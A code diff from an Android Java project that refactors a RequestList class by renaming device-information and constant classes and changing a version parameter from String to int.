@@ -11,7 +11,7 @@ import android.content.SharedPreferences;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
-import com.inet.android.info.GetInfo;
+import com.inet.android.info.DeviceInformation;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.loopj.android.http.RequestParams;
@@ -33,7 +33,7 @@ public class RequestList {
 						+ sp.getString("account", "account"));
 
 		TokenRequest tr = new TokenRequest(mContext);
-		tr.sendRequest(ConstantRequest.TYPE_FIRST_TOKEN_REQUEST);
+		tr.sendRequest(ConstantValue.TYPE_FIRST_TOKEN_REQUEST);
 	}
 
 	/**
@@ -128,7 +128,7 @@ public class RequestList {
 						+ sp.getString("account", "account"));
 
 		TokenRequest tr = new TokenRequest(mContext);
-		tr.sendRequest(ConstantRequest.TYPE_SECOND_TOKEN_REQUEST);
+		tr.sendRequest(ConstantValue.TYPE_SECOND_TOKEN_REQUEST);
 	}
 
 	/**
@@ -229,7 +229,7 @@ public class RequestList {
 	 * Sending demand request
 	 */
 	public static void sendDemandRequest(String request, int infoType,
-			String complete, String version, Context mContext) {
+			String complete, int version, Context mContext) {
 		OnDemandRequest dr = new OnDemandRequest(infoType, complete, version,
 				mContext);
 		dr.sendRequest(request);
@@ -240,8 +240,8 @@ public class RequestList {
 	 */
 	public static void sendInfoDeviceRequest(Context mContext) {
 
-		GetInfo getInfo = new GetInfo(mContext);
-		getInfo.startGetInfo();
+		DeviceInformation device = new DeviceInformation(mContext);
+		device.getInfo();
 	}
 
 	/**
